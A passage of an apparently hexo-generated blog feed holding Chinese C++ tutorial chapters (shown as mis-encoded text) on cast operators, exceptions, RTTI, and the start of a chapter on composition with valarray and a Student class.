&quot;</span> &lt;&lt; <span class="built_in">std</span>::hex &lt;&lt; addr_val &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">int</span>* pi_back = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span>*&gt;(addr_val); <span class="comment">// æ•´æ•°è½¬å›æŒ‡é’ˆ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Value via int-&gt;ptr-&gt;int: &quot;</span> &lt;&lt; <span class="built_in">std</span>::dec &lt;&lt; *pi_back &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 65</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ç›¸å…³æŒ‡é’ˆç±»å‹è½¬æ¢ (éå¸¸å±é™©)</span></span><br><span class="line">    Data d = &#123;<span class="number">1</span>, <span class="number">3.14</span>&#125;;</span><br><span class="line">    Data* pd = &amp;d;</span><br><span class="line">    <span class="comment">// å°† Data* é‡æ–°è§£é‡Šä¸º int*</span></span><br><span class="line">    <span class="keyword">int</span>* p_int_from_data = <span class="keyword">reinterpret_cast</span>&lt;<span class="keyword">int</span>*&gt;(pd);</span><br><span class="line">    <span class="comment">// è®¿é—® *p_int_from_data é€šå¸¸ä¼šå¾—åˆ° d.a çš„å€¼ (å–å†³äºå†…å­˜å¸ƒå±€)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Reinterpreted int from Data*: &quot;</span> &lt;&lt; *p_int_from_data &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// å¯èƒ½è¾“å‡º 1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-dynamic-cast-lt-TargetType-gt-expression"><a href="#4-dynamic-cast-lt-TargetType-gt-expression" class="headerlink" title="4. dynamic_cast&lt;TargetType&gt;(expression)"></a>4. <code>dynamic_cast&lt;TargetType&gt;(expression)</code></h3><p><code>dynamic_cast</code> ç”¨äºåœ¨å…·æœ‰<strong>è™šå‡½æ•°</strong>çš„ç±»å±‚æ¬¡ç»“æ„ä¸­è¿›è¡Œ<strong>å®‰å…¨çš„å‘ä¸‹è½¬æ¢</strong>ã€‚å®ƒåœ¨<strong>è¿è¡Œæ—¶</strong>æ£€æŸ¥è½¬æ¢çš„æœ‰æ•ˆæ€§ã€‚</p><ul><li>  <strong>æŒ‡é’ˆè½¬æ¢:</strong> å¦‚æœè½¬æ¢æ— æ•ˆï¼Œè¿”å› <code>nullptr</code>ã€‚</li><li>  <strong>å¼•ç”¨è½¬æ¢:</strong> å¦‚æœè½¬æ¢æ— æ•ˆï¼ŒæŠ›å‡º <code>std::bad_cast</code> å¼‚å¸¸ã€‚</li></ul><p>(è¯¦ç»†å†…å®¹è¯·å‚è€ƒ 15.4 RTTI)</p><h3 id="æ€»ç»“æ¯”è¾ƒ"><a href="#æ€»ç»“æ¯”è¾ƒ" class="headerlink" title="æ€»ç»“æ¯”è¾ƒ"></a>æ€»ç»“æ¯”è¾ƒ</h3><table><thead><tr><th align="left">è¿ç®—ç¬¦</th><th align="left">ä¸»è¦ç”¨é€”</th><th align="left">å®‰å…¨æ€§</th><th align="left">è¿è¡Œæ—¶æ£€æŸ¥</th><th align="left">å¯¹ <code>const</code>/<code>volatile</code></th><th align="left">å¤‡æ³¨</th></tr></thead><tbody><tr><td align="left"><code>static_cast</code></td><td align="left">ç›¸å…³ç±»å‹è½¬æ¢ã€æ•°å€¼è½¬æ¢ã€<code>void*</code> è½¬æ¢</td><td align="left">ç›¸å¯¹å®‰å…¨</td><td align="left">å¦</td><td align="left">ä¸èƒ½ç§»é™¤</td><td align="left">å‘ä¸‹è½¬æ¢ä¸å®‰å…¨</td></tr><tr><td align="left"><code>const_cast</code></td><td align="left">ç§»é™¤æˆ–æ·»åŠ  <code>const</code>/<code>volatile</code></td><td align="left">ä½ (æ˜“æœªå®šä¹‰è¡Œä¸º)</td><td align="left">å¦</td><td align="left">å”¯ä¸€èƒ½æ“ä½œ</td><td align="left">ä¸èƒ½æ”¹å˜åŸºæœ¬ç±»å‹ï¼Œä¿®æ”¹ const å¯¹è±¡æ˜¯æœªå®šä¹‰è¡Œä¸º</td></tr><tr><td align="left"><code>reinterpret_cast</code></td><td align="left">ä½çº§åˆ«ä½æ¨¡å¼é‡æ–°è§£é‡Šã€æŒ‡é’ˆæ•´æ•°äº’è½¬ã€ä¸ç›¸å…³æŒ‡é’ˆäº’è½¬</td><td align="left">éå¸¸ä½</td><td align="left">å¦</td><td align="left">ä¸èƒ½ç§»é™¤</td><td align="left">ä¾èµ–å®ç°ã€ä¸å¯ç§»æ¤ã€ææ˜“å‡ºé”™</td></tr><tr><td align="left"><code>dynamic_cast</code></td><td align="left">å®‰å…¨çš„å‘ä¸‹è½¬æ¢ï¼ˆå¤šæ€ç±»å‹ï¼‰</td><td align="left">é«˜</td><td align="left">æ˜¯</td><td align="left">ä¸èƒ½ç§»é™¤</td><td align="left">éœ€è¦è™šå‡½æ•°ï¼Œå¤±è´¥æ—¶è¿”å› <code>nullptr</code> æˆ–æŠ›å¼‚å¸¸</td></tr></tbody></table><p><strong>ä½¿ç”¨åŸåˆ™:</strong></p><ul><li>  ä¼˜å…ˆä½¿ç”¨éšå¼è½¬æ¢å’Œè™šå‡½æ•°ã€‚</li><li>  å½“éœ€è¦æ˜¾å¼è½¬æ¢æ—¶ï¼Œé€‰æ‹©æ„å›¾æœ€æ˜ç¡®ã€é™åˆ¶æœ€ä¸¥æ ¼çš„è½¬æ¢è¿ç®—ç¬¦ã€‚</li><li>  å°½é‡ä½¿ç”¨ <code>static_cast</code> è¿›è¡Œâ€œåˆç†â€çš„è½¬æ¢ã€‚</li><li>  åªåœ¨éœ€è¦æ”¹å˜ <code>const</code>/<code>volatile</code> å±æ€§æ—¶ä½¿ç”¨ <code>const_cast</code>ï¼Œå¹¶ç¡®ä¿ä¸ä¿®æ”¹åŸå§‹ <code>const</code> å¯¹è±¡ã€‚</li><li>  é¿å…ä½¿ç”¨ <code>reinterpret_cast</code>ï¼Œé™¤éç»å¯¹å¿…è¦ä¸”å®Œå…¨ç†è§£åæœã€‚</li><li>  åœ¨å¤šæ€ç±»å‹å‘ä¸‹è½¬æ¢æ—¶ï¼Œä¼˜å…ˆä½¿ç”¨ <code>dynamic_cast</code> ä»¥ç¡®ä¿å®‰å…¨ã€‚</li></ul><h2 id="15-6-æ€»ç»“"><a href="#15-6-æ€»ç»“" class="headerlink" title="15.6 æ€»ç»“"></a>15.6 æ€»ç»“</h2><p>æœ¬ç« æ¢è®¨äº† C++ ä¸­ä¸€äº›é«˜çº§ç‰¹æ€§å’Œå¤„ç†ç‰¹æ®Šæƒ…å†µçš„æŠ€æœ¯ï¼ŒåŒ…æ‹¬å‹å…ƒã€åµŒå¥—ç±»ã€å¼‚å¸¸å¤„ç†å’Œè¿è¡Œæ—¶ç±»å‹è¯†åˆ«ï¼ˆRTTIï¼‰ä»¥åŠç±»å‹è½¬æ¢è¿ç®—ç¬¦ã€‚è¿™äº›å·¥å…·æä¾›äº†æ›´ç²¾ç»†çš„æ§åˆ¶å’Œæ›´å¼ºå¤§çš„é”™è¯¯å¤„ç†èƒ½åŠ›ã€‚</p><p>ä¸»è¦å†…å®¹å›é¡¾ï¼š</p><ol><li><p><strong>å‹å…ƒ (Friends):</strong></p><ul><li>  å…è®¸ç‰¹å®šçš„å¤–éƒ¨å‡½æ•°ï¼ˆ<strong>å‹å…ƒå‡½æ•°</strong>ï¼‰ã€ç±»ï¼ˆ<strong>å‹å…ƒç±»</strong>ï¼‰æˆ–æˆå‘˜å‡½æ•°ï¼ˆ<strong>å‹å…ƒæˆå‘˜å‡½æ•°</strong>ï¼‰è®¿é—®ä¸€ä¸ªç±»çš„ <code>private</code> å’Œ <code>protected</code> æˆå‘˜ã€‚</li><li>  é€šè¿‡åœ¨å®¿ä¸»ç±»ä¸­ä½¿ç”¨ <code>friend</code> å…³é”®å­—å£°æ˜ã€‚</li><li>  å‹å…ƒå…³ç³»ä¸æ˜¯ä¼ é€’çš„ï¼Œä¹Ÿä¸æ˜¯å¯¹ç§°çš„ã€‚</li><li>  å‹å…ƒç ´åäº†å°è£…æ€§ï¼Œåº”è°¨æ…ä½¿ç”¨ï¼Œé€šå¸¸ç”¨äºé‡è½½è¿ç®—ç¬¦ï¼ˆå¦‚ <code>&lt;&lt;</code>ï¼‰æˆ–å®ç°ç´§å¯†åä½œçš„ç±»ã€‚</li></ul></li><li><p><strong>åµŒå¥—ç±» (Nested Classes):</strong></p><ul><li>  åœ¨ä¸€ä¸ªç±»ï¼ˆå¤–å›´ç±»ï¼‰å†…éƒ¨å®šä¹‰çš„ç±»ã€‚</li><li>  ä½œç”¨åŸŸå±€é™äºå¤–å›´ç±»ï¼Œå¤–éƒ¨è®¿é—®éœ€ä½¿ç”¨ä½œç”¨åŸŸè§£æç¬¦ (<code>Enclosing::Nested</code>)ã€‚</li><li>  åµŒå¥—ç±»å¯ä»¥è®¿é—®å¤–å›´ç±»çš„æ‰€æœ‰æˆå‘˜ï¼ˆé€šè¿‡å¯¹è±¡ã€æŒ‡é’ˆæˆ–å¼•ç”¨ï¼‰ã€‚</li><li>  å¤–å›´ç±»è®¿é—®åµŒå¥—ç±»æˆå‘˜å—åµŒå¥—ç±»è‡ªèº«è®¿é—®æ§åˆ¶é™åˆ¶ã€‚</li><li>  å¸¸ç”¨äºå®ç°ä¸å¤–å›´ç±»ç›¸å…³çš„è¾…åŠ©ç±»æˆ–éšè—å®ç°ç»†èŠ‚ã€‚</li></ul></li><li><p><strong>å¼‚å¸¸å¤„ç† (Exceptions):</strong></p><ul><li>  ä¸€ç§ç»“æ„åŒ–çš„é”™è¯¯å¤„ç†æœºåˆ¶ï¼Œç”¨äºå¤„ç†è¿è¡Œæ—¶å‘ç”Ÿçš„å¼‚å¸¸æƒ…å†µã€‚</li><li>  ä½¿ç”¨ <code>try</code> å—åŒ…å›´å¯èƒ½æŠ›å‡ºå¼‚å¸¸çš„ä»£ç ï¼Œ<code>throw</code> è¯­å¥æŠ›å‡ºå¼‚å¸¸ï¼Œ<code>catch</code> å—æ•è·å¹¶å¤„ç†å¼‚å¸¸ã€‚</li><li>  ç›¸æ¯”é”™è¯¯ç æˆ– <code>abort()</code>ï¼Œå¼‚å¸¸èƒ½æ›´å¥½åœ°åˆ†ç¦»é”™è¯¯æ£€æµ‹å’Œå¤„ç†ï¼Œè‡ªåŠ¨æ²¿è°ƒç”¨æ ˆä¼ æ’­ã€‚</li><li>  æ¨èä½¿ç”¨<strong>ç±»å¯¹è±¡</strong>ï¼ˆæœ€å¥½ç»§æ‰¿è‡ª <code>std::exception</code>ï¼‰ä½œä¸ºå¼‚å¸¸ç±»å‹ï¼Œå¯ä»¥æºå¸¦æ›´å¤šä¿¡æ¯å¹¶åˆ©ç”¨ç»§æ‰¿è¿›è¡Œåˆ†ç±»å¤„ç†ã€‚</li><li>  <strong>æ ˆè§£é€€ (Stack Unwinding):</strong> å¼‚å¸¸å‘ç”Ÿæ—¶ï¼Œå±€éƒ¨å¯¹è±¡æŒ‰æ„é€ ç›¸åé¡ºåºé”€æ¯ï¼Œå…¶ææ„å‡½æ•°è¢«è°ƒç”¨ï¼Œæ˜¯ RAII å®ç°èµ„æºå®‰å…¨çš„å…³é”®ã€‚</li><li>  <strong><code>noexcept</code> (C++11):</strong> ç”¨äºå£°æ˜å‡½æ•°ä¿è¯ä¸æŠ›å‡ºå¼‚å¸¸ï¼Œæœ‰åŠ©äºä¼˜åŒ–å’Œå¼‚å¸¸å®‰å…¨ä¿è¯ã€‚ææ„å‡½æ•°åº”ä¸º <code>noexcept</code>ã€‚</li><li>  <strong><code>throw;</code></strong> ç”¨äºåœ¨ <code>catch</code> å—ä¸­é‡æ–°æŠ›å‡ºå½“å‰å¼‚å¸¸ã€‚</li><li>  <strong><code>catch(...)</code></strong> ç”¨äºæ•è·ä»»ä½•ç±»å‹çš„å¼‚å¸¸ã€‚</li><li>  å¼‚å¸¸å¤„ç†æœ‰æ€§èƒ½å¼€é”€ï¼Œé€‚ç”¨äºå¤„ç†<strong>å¼‚å¸¸</strong>è€Œéå¸¸è§„æµç¨‹ã€‚</li></ul></li><li><p><strong>RTTI (è¿è¡Œæ—¶ç±»å‹è¯†åˆ«):</strong></p><ul><li>  å…è®¸ç¨‹åºåœ¨è¿è¡Œæ—¶æŸ¥è¯¢å¯¹è±¡çš„å®é™…ç±»å‹ä¿¡æ¯ã€‚</li><li>  ä¸»è¦ç”¨äºå…·æœ‰<strong>è™šå‡½æ•°</strong>çš„å¤šæ€ç±»å±‚æ¬¡ç»“æ„ã€‚</li><li>  <strong><code>dynamic_cast&lt;&gt;</code>:</strong> ç”¨äºå®‰å…¨çš„å‘ä¸‹è½¬æ¢ã€‚å¯¹æŒ‡é’ˆè½¬æ¢å¤±è´¥è¿”å› <code>nullptr</code>ï¼›å¯¹å¼•ç”¨è½¬æ¢å¤±è´¥æŠ›å‡º <code>std::bad_cast</code>ã€‚</li><li>  <strong><code>typeid()</code>:</strong> è¿”å›å¯¹è±¡çš„ç±»å‹ä¿¡æ¯ (<code>std::type_info</code> å¯¹è±¡ï¼‰ï¼Œå¯ç”¨äºæ¯”è¾ƒç²¾ç¡®ç±»å‹ã€‚å¯¹ç©ºæŒ‡é’ˆæ“ä½œæŠ›å‡º <code>std::bad_typeid</code>ã€‚</li><li>  <strong><code>std::type_info</code>:</strong> æä¾› <code>name()</code> æ–¹æ³•è·å–ç±»å‹åç§°ï¼ˆæ ¼å¼ä¾èµ–å®ç°ï¼‰å’Œæ¯”è¾ƒè¿ç®—ç¬¦ã€‚</li><li>  åº”ä¼˜å…ˆä½¿ç”¨è™šå‡½æ•°å®ç°å¤šæ€ï¼ŒRTTI ä½œä¸ºè¡¥å……æˆ–ç‰¹å®šåœºæ™¯ä¸‹çš„è§£å†³æ–¹æ¡ˆã€‚</li></ul></li><li><p><strong>ç±»å‹è½¬æ¢è¿ç®—ç¬¦:</strong></p><ul><li>  C++ æä¾›äº†å››ä¸ªæ˜¾å¼ç±»å‹è½¬æ¢è¿ç®—ç¬¦ï¼Œæ¯” C é£æ ¼è½¬æ¢æ›´å®‰å…¨ã€æ„å›¾æ›´æ˜ç¡®ã€‚</li><li>  <strong><code>static_cast&lt;&gt;</code>:</strong> ç”¨äºç›¸å…³çš„ã€ç¼–è¯‘æ—¶å¯æ£€æŸ¥çš„è½¬æ¢ï¼ˆæ•°å€¼ã€å‘ä¸Šè½¬æ¢ã€ä¸å®‰å…¨çš„å‘ä¸‹è½¬æ¢ã€<code>void*</code>ï¼‰ã€‚</li><li>  <strong><code>const_cast&lt;&gt;</code>:</strong> å”¯ä¸€èƒ½ç§»é™¤æˆ–æ·»åŠ  <code>const</code>/<code>volatile</code> çš„è½¬æ¢ç¬¦ã€‚ä¿®æ”¹åŸå§‹ <code>const</code> å¯¹è±¡æ˜¯æœªå®šä¹‰è¡Œä¸ºã€‚</li><li>  <strong><code>reinterpret_cast&lt;&gt;</code>:</strong> ä½çº§åˆ«ä½æ¨¡å¼é‡æ–°è§£é‡Šï¼Œç”¨äºä¸ç›¸å…³æŒ‡é’ˆè½¬æ¢ã€æŒ‡é’ˆæ•´æ•°äº’è½¬ç­‰ã€‚éå¸¸å±é™©ï¼Œä¸å¯ç§»æ¤ã€‚</li><li>  <strong><code>dynamic_cast&lt;&gt;</code>:</strong> ç”¨äºå¤šæ€ç±»å‹å®‰å…¨çš„è¿è¡Œæ—¶å‘ä¸‹è½¬æ¢ã€‚</li></ul></li></ol><p>æœ¬ç« ä»‹ç»çš„ç‰¹æ€§ä¸ºå¤„ç†ç±»é—´å…³ç³»ã€é”™è¯¯æ¢å¤å’Œç±»å‹æŸ¥è¯¢æä¾›äº†æ›´å¤šå·¥å…·ï¼Œä½†ä¹Ÿå¸¦æ¥äº†å¤æ‚æ€§ã€‚ç†è§£å®ƒä»¬çš„åŸç†ã€é€‚ç”¨åœºæ™¯å’Œæ½œåœ¨é£é™©å¯¹äºç¼–å†™å¥å£®ã€é«˜æ•ˆçš„ C++ ç¨‹åºéå¸¸é‡è¦ã€‚</p>]]></content>
      
      
      
        <tags>
            
            <tag> Program </tag>
            
            <tag> C++ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Chapter 14 C++ä¸­çš„ä»£ç é‡ç”¨</title>
      <link href="2025/04/30/Cpp_tutorial_Chapter_14/"/>
      <url>2025/04/30/Cpp_tutorial_Chapter_14/</url>
      
        <content type="html"><![CDATA[<h2 id="14-1-åŒ…å«å¯¹è±¡æˆå‘˜çš„ç±»"><a href="#14-1-åŒ…å«å¯¹è±¡æˆå‘˜çš„ç±»" class="headerlink" title="14.1 åŒ…å«å¯¹è±¡æˆå‘˜çš„ç±»"></a>14.1 åŒ…å«å¯¹è±¡æˆå‘˜çš„ç±»</h2><p>é™¤äº†ç»§æ‰¿ (â€œis-aâ€ å…³ç³») ä¹‹å¤–ï¼ŒC++ æä¾›äº†å¦ä¸€ç§é‡è¦çš„ä»£ç é‡ç”¨æœºåˆ¶ï¼š<strong>åŒ…å« (Containment)</strong> æˆ– <strong>ç»„åˆ (Composition)**ã€‚è¿™ç§æ–¹å¼æ¨¡æ‹Ÿçš„æ˜¯ **â€has-aâ€</strong> ï¼ˆæœ‰ä¸€ä¸ªï¼‰å…³ç³»ã€‚</p><p>å½“ä¸€ä¸ªç±»ï¼ˆç§°ä¸º<strong>åŒ…å«ç±»</strong>æˆ–<strong>å®¹å™¨ç±»</strong>ï¼‰å°†å¦ä¸€ä¸ªç±»çš„å¯¹è±¡ä½œä¸ºå…¶<strong>æˆå‘˜å˜é‡</strong>æ—¶ï¼Œå°±ä½¿ç”¨äº†åŒ…å«æˆ–ç»„åˆã€‚ä¾‹å¦‚ï¼š</p><ul><li>  ä¸€è¾† <code>Car</code> <strong>æœ‰ä¸€ä¸ª</strong> <code>Engine</code>ã€‚</li><li>  ä¸€ä¸ª <code>Person</code> <strong>æœ‰ä¸€ä¸ª</strong> <code>Name</code> (å¯èƒ½æ˜¯ <code>string</code> å¯¹è±¡)ã€‚</li><li>  ä¸€ä¸ª <code>Order</code> <strong>æœ‰</strong>ä¸€ç»„ <code>OrderItem</code> å¯¹è±¡ã€‚</li></ul><p>è¿™ç§æ–¹å¼å…è®¸æˆ‘ä»¬é€šè¿‡ç»„åˆå·²æœ‰çš„ã€åŠŸèƒ½å®Œå–„çš„ç±»æ¥æ„å»ºæ›´å¤æ‚çš„æ–°ç±»ã€‚</p><p>æœ¬èŠ‚æˆ‘ä»¬å°†è®¾è®¡ä¸€ä¸ª <code>Student</code> ç±»ï¼Œå®ƒå°†åŒ…å«ä¸€ä¸ª <code>std::string</code> å¯¹è±¡ï¼ˆè¡¨ç¤ºå­¦ç”Ÿå§“åï¼‰å’Œä¸€ä¸ª <code>std::valarray&lt;double&gt;</code> å¯¹è±¡ï¼ˆè¡¨ç¤ºå­¦ç”Ÿçš„è€ƒè¯•åˆ†æ•°ï¼‰ã€‚</p><h3 id="14-1-1-valarray-ç±»ç®€ä»‹"><a href="#14-1-1-valarray-ç±»ç®€ä»‹" class="headerlink" title="14.1.1 valarray ç±»ç®€ä»‹"></a>14.1.1 valarray ç±»ç®€ä»‹</h3><p><code>valarray</code> æ˜¯ C++ æ ‡å‡†åº“ä¸­çš„ä¸€ä¸ªæ¨¡æ¿ç±»ï¼ˆå®šä¹‰åœ¨ <code>&lt;valarray&gt;</code> å¤´æ–‡ä»¶ä¸­ï¼‰ï¼Œä¸“é—¨è®¾è®¡ç”¨äºç®€åŒ–å’Œä¼˜åŒ–<strong>æ•°å€¼æ•°ç»„</strong>çš„æ“ä½œã€‚å®ƒæä¾›äº†è®¸å¤šæ–¹ä¾¿çš„åŠŸèƒ½ï¼Œä¾‹å¦‚ï¼š</p><ul><li>  <strong>é€å…ƒç´ è¿ç®—:</strong> å¯ä»¥ç›´æ¥å¯¹æ•´ä¸ª <code>valarray</code> å¯¹è±¡æ‰§è¡Œç®—æœ¯è¿ç®—ï¼ˆå¦‚ <code>+</code>, <code>-</code>, <code>*</code>, <code>/</code>ï¼‰ï¼Œè¿ç®—ä¼šè‡ªåŠ¨åº”ç”¨äºæ¯ä¸ªå¯¹åº”çš„å…ƒç´ ã€‚</li><li>  <strong>æ•°å­¦å‡½æ•°:</strong> å¯ä»¥å°†è®¸å¤šæ ‡å‡†æ•°å­¦å‡½æ•°ï¼ˆå¦‚ <code>sqrt()</code>, <code>abs()</code>, <code>sin()</code>ï¼‰åº”ç”¨äº <code>valarray</code> çš„æ‰€æœ‰å…ƒç´ ã€‚</li><li>  <strong>åˆ‡ç‰‡å’Œç´¢å¼•:</strong> æä¾›çµæ´»çš„æ–¹å¼æ¥è®¿é—®å’Œæ“ä½œæ•°ç»„çš„å­é›†ã€‚</li><li>  <strong>èšåˆæ“ä½œ:</strong> å†…ç½®äº†è®¡ç®—æ€»å’Œ (<code>sum()</code>)ã€å¹³å‡å€¼ (<code>sum()/size()</code>)ã€æœ€å¤§å€¼ (<code>max()</code>)ã€æœ€å°å€¼ (<code>min()</code>) ç­‰æ–¹æ³•ã€‚</li></ul><p><strong>ç®€å•ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt; // åŒ…å« valarray å¤´æ–‡ä»¶</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;   // ç”¨äºåˆå§‹åŒ–ç¤ºä¾‹</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">double</span>&gt; data = &#123;<span class="number">1.1</span>, <span class="number">2.2</span>, <span class="number">3.3</span>, <span class="number">4.4</span>&#125;;</span><br><span class="line">    <span class="function"><span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; <span class="title">v1</span><span class="params">(data.data(), data.size())</span></span>; <span class="comment">// ä» double æ•°ç»„åˆ›å»º valarray</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; v2 = &#123;<span class="number">10.0</span>, <span class="number">10.0</span>, <span class="number">10.0</span>, <span class="number">10.0</span>&#125;; <span class="comment">// ä½¿ç”¨åˆå§‹åŒ–åˆ—è¡¨ (C++11)</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; <span class="title">v_sum</span><span class="params">(<span class="number">4</span>)</span></span>; <span class="comment">// åˆ›å»ºä¸€ä¸ªå¤§å°ä¸º 4 çš„ valarray</span></span><br><span class="line"></span><br><span class="line">    v_sum = v1 + v2; <span class="comment">// é€å…ƒç´ ç›¸åŠ : v_sum = &#123;11.1, 12.2, 13.3, 14.4&#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Sum of elements in v1: &quot;</span> &lt;&lt; v1.sum() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 11</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Size of v1: &quot;</span> &lt;&lt; v1.size() &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;         <span class="comment">// è¾“å‡º 4</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Element at index 1 in v_sum: &quot;</span> &lt;&lt; v_sum[<span class="number">1</span>] &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// è¾“å‡º 12.2</span></span><br><span class="line"></span><br><span class="line">    v1 *= <span class="number">2.0</span>; <span class="comment">// æ‰€æœ‰å…ƒç´ ä¹˜ä»¥ 2: v1 = &#123;2.2, 4.4, 6.6, 8.8&#125;</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">double</span> x : v1) &#123; <span class="comment">// C++11 èŒƒå›´ for å¾ªç¯</span></span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬å°†ä½¿ç”¨ <code>valarray&lt;double&gt;</code> æ¥å­˜å‚¨ <code>Student</code> çš„å¤šé—¨è¯¾æˆç»©ã€‚</p><h3 id="14-1-2-Student-ç±»çš„è®¾è®¡"><a href="#14-1-2-Student-ç±»çš„è®¾è®¡" class="headerlink" title="14.1.2 Student ç±»çš„è®¾è®¡"></a>14.1.2 Student ç±»çš„è®¾è®¡</h3><p>æˆ‘ä»¬çš„ <code>Student</code> ç±»éœ€è¦å­˜å‚¨å§“åå’Œä¸€ç»„åˆ†æ•°ã€‚</p><ul><li>  <strong>å§“å:</strong> ä½¿ç”¨ <code>std::string</code> ç±»ã€‚</li><li>  <strong>åˆ†æ•°:</strong> ä½¿ç”¨ <code>std::valarray&lt;double&gt;</code> ç±»ã€‚</li></ul><p><strong>æ¥å£è®¾è®¡:</strong></p><p>æˆ‘ä»¬éœ€è¦æä¾›æ–¹æ³•æ¥ï¼š</p><ul><li>  æ„é€  <code>Student</code> å¯¹è±¡ï¼ˆæä¾›å§“åå’Œåˆ†æ•°ï¼‰ã€‚</li><li>  è·å–å­¦ç”Ÿçš„å¹³å‡åˆ†ã€‚</li><li>  è·å–å­¦ç”Ÿçš„å§“åã€‚</li><li>  è·å–æŸä¸€é—¨è¯¾çš„åˆ†æ•°ã€‚</li><li>  è¾“å‡ºå­¦ç”Ÿçš„ä¿¡æ¯ã€‚</li></ul><p><strong>studentc.h (Student ç±»æ¥å£)</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> STUDENTC_H_</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> STUDENTC_H_</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;valarray&gt; // åŒ…å« valarray</span></span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span> &#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">// ä½¿ç”¨åŒ…å«ï¼ˆç»„åˆï¼‰: Student &quot;has-a&quot; string and &quot;has-a&quot; valarray</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name;               <span class="comment">// å§“å</span></span><br><span class="line">    <span class="built_in">std</span>::valarray&lt;<span class="keyword">double</span>&gt; scores;   <span class="comment">// åˆ†æ•° (ä½¿ç”¨ valarray)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// ç§æœ‰æ–¹æ³•ï¼Œç”¨äºè¾“å‡ºåˆ†æ•°</span></span><br><span class="line">    <span class="function"><span class="built_in">std</span>::ostream &amp; <span class="title">arr_out</span><span class="params">(<span class="built_in">std</span>::ostream &amp; os)</span> <span class="keyword">const</span></span>;</span><br><span 